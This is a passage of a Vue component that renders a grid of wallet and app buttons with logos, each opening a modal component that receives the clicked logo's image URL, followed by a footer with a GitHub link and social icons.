                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal65"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c.jpg"
                  alt=""
                />
                <h4>Flare</h4>
              </button>

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal66"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/3abd1720-260e-495a-2e31-3d0b349e0d00/lg"
                  alt=""
                />
                <h4>KyberSwap</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal67"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0.jpg"
                  alt=""
                />
                <h4>AToken</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal68"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  class="coin-img"
                  src="/img/lg/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpg"
                  alt=""
                />
                <h4>RWallet</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal69"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/2235b648bdf382bc1a6960f1db8eda5c71f65a1996e6cb549d24783ca58a2903.jpg"
                  alt=""
                />
                <h4>Binana</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal70"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/76428179ce9213ab6f8f49923310efcf5eea089764196c7a2018bea8afcd6603.jpg"
                  alt=""
                />
                <h4>PayTube</h4>
              </button>
              <!-- Modal -->

              <button
                @click="openModal"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal72"
                class="btn coin"
                style="
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                "
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/img/lg/dd8ee41915d967e547c80266e883d77ee808427405f4e8026a85ac1308104221.png"
                  alt=""
                />
                <h4>Linen</h4>
              </button>
              <!-- Modal -->
            </div>
          </div>
          <div class="row py-10">
            <div class="text-center coin-section-footer">
              <h6>
                Open an app submission issue on GitHub to add your app
                <span
                  ><a
                    style="text-decoration: none; color: #0150b8"
                    href="https://www.github.com/"
                    >here.</a
                  >
                </span>
              </h6>
              <div class="text-center coin-section-icons">
                <i
                  style="color: #0c0e29; margin-right: 12px"
                  class="fab fa-facebook"
                  aria-hidden="true"
                ></i>
                <i
                  style="color: #0c0e29; margin-right: 12px"
                  class="fab fa-twitter"
                  aria-hidden="true"
                ></i>
                <i
                  style="color: #0c0e29 !important"
                  class="fab fa-discord"
                  aria-hidden="true"
                ></i>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <ModalApp
      v-show="showModal"
      @close-modal="showModal = false"
      :logo-url="saveImgUrl"
      @showOtherModal="showOtherModalAction"
    />
    <OtherModal
      v-show="showOtherModal"
      @close-modal="showOtherModal = false"
      :logo-url="saveImgUrl"
    />
  </div>
</template>

<script>
import ModalApp from "@/components/ModalApp.vue";
import OtherModal from "@/components/OtherModal.vue";
export default {
  components: {
    ModalApp,
    OtherModal,
  },
  data() {
    return {
      showModal: false,
      showOtherModal: false,
      saveImgUrl:
        "http://localhost:3000/img/lg/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png",
    };
  },
  methods: {
    openModal(event) {
      this.showModal = true;
      this.saveImgUrl = event.target.src;
    },
    showOtherModalAction() {
      this.showModal = false;
      this.showOtherModal = true;
    },
  },
};
</script>

<style></style>
